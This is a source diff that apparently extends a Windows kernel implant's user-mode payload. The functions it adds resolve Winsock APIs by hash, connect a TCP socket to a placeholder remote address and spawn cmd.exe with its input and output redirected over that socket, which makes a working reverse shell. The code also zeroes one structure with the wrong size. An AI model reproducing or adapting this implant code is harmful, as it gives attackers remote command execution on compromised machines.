@@ -70,13 +70,16 @@ KENTRY void KmEntryPoint( VOID )
 UENTRY void UmEntryPoint( IN PCHAR Str )
 {
 	CHAR                lib[20];
-	CHAR                prc[16];
+	CHAR                prc[20];
 	BOOL                ret;
 	BOOL                rem;
 	PVOID               k32;
 	PVOID               ws2;
+	SOCKET              sck;
+	struct sockaddr_in  sar;
 	STARTUPINFOA        sta;
 	PROCESS_INFORMATION inf;
+	WSADATA             wsd;
 	UM_API              api;
 
 	ws2 = PebGetModule( H_WS2_32 );
@@ -84,10 +87,11 @@ UENTRY void UmEntryPoint( IN PCHAR Str )
 
 	if ( k32 || ws2 )
 	{
-		api.CloseHandle    = PeGetFuncEat( k32, H_CLOSEHANDLE );
-		api.FreeLibrary    = PeGetFuncEat( k32, H_FREELIBRARY );
-		api.LoadLibraryA   = PeGetFuncEat( k32, H_LOADLIBRARYA );
-		api.CreateProcessA = PeGetFuncEat( k32, H_CREATEPROCESSA );
+		api.CloseHandle         = PeGetFuncEat( k32, H_CLOSEHANDLE );
+		api.FreeLibrary         = PeGetFuncEat( k32, H_FREELIBRARY );
+		api.LoadLibraryA        = PeGetFuncEat( k32, H_LOADLIBRARYA );
+		api.CreateProcessA      = PeGetFuncEat( k32, H_CREATEPROCESSA );
+		api.WaitForSingleObject = PeGetFuncEat( k32, H_WAITFORSINGLEOBJECT );
 
 		if ( ! ws2 )
 		{
@@ -109,38 +113,72 @@ UENTRY void UmEntryPoint( IN PCHAR Str )
 			rem = FALSE;
 		};
 
-		api.WSASocket   = PeGetFuncEat( ws2, H_WSASOCKET );
+		api.WSASocketA  = PeGetFuncEat( ws2, H_WSASOCKETA );
 		api.WSAConnect  = PeGetFuncEat( ws2, H_WSACONNECT );
 		api.WSAStartup  = PeGetFuncEat( ws2, H_WSASTARTUP );
 		api.WSACleanup  = PeGetFuncEat( ws2, H_WSACLEANUP );
 		api.closesocket = PeGetFuncEat( ws2, H_CLOSESOCKET );
 
-		/*!
-		RtlSecureZeroMemory(&inf, sizeof(inf));
-		RtlSecureZeroMemory(&sta, sizeof(inf));
+		api.WSAStartup( MAKEWORD(2, 2), &wsd );
 
-		prc[0] = 'c';
-		prc[1] = 'm';
-		prc[2] = 'd';
-		prc[3] = '.';
-		prc[4] = 'e';
-		prc[5] = 'x';
-		prc[6] = 'e';
-		rpc[7] = '\0';
+		sck = api.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
+		
+		if ( sck != INVALID_SOCKET )
+		{
+			sar.sin_family      = AF_INET;
+			sar.sin_port        = 0x4242;
+			sar.sin_addr.s_addr = 0x43434343;
 
-		sta.cb = sizeof(STARTUPINFOA);
+			if ( ! api.WSAConnect( sck, 
+					       CPTR( &sar ), 
+					       sizeof(sar), 
+					       NULL, 
+					       NULL, 
+					       NULL, 
+					       NULL ) )
+			{
 
-		ret = api.CreateProcessA( NULL,
-				          CPTR(prc),
-					  NULL,
-					  NULL,
-					  TRUE,
-					  0,
-					  NULL,
-					  NULL,
-					  &sta,
-					  &inf );
-					  */
+		
+				RtlSecureZeroMemory(&inf, sizeof(inf));
+				RtlSecureZeroMemory(&sta, sizeof(inf));
+
+				prc[0] = 'c';
+				prc[1] = 'm';
+				prc[2] = 'd';
+				prc[3] = '.';
+				prc[4] = 'e';
+				prc[5] = 'x';
+				prc[6] = 'e';
+				prc[7] = '\0';
+
+				sta.hStdError  = CPTR( sck );
+				sta.hStdInput  = CPTR( sck );
+				sta.hStdOutput = CPTR( sck );
+				sta.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+				sta.cb         = sizeof( STARTUPINFOA );
+
+				ret = api.CreateProcessA( CPTR( NULL ),
+				 		          CPTR( &prc ),
+							  NULL,
+							  NULL,
+							  TRUE,
+							  0,
+							  NULL,
+							  NULL,
+							  &sta,
+							  &inf );
+
+				if ( ret ) 
+				{
+					api.WaitForSingleObject( inf.hProcess, INFINITE );
+					api.CloseHandle( inf.hProcess );
+					api.CloseHandle( inf.hThread );
+					api.closesocket( sck );
+				};
+			}
+		};
+
+		api.WSACleanup();
 
 		if ( rem )
 			api.FreeLibrary( ws2 );
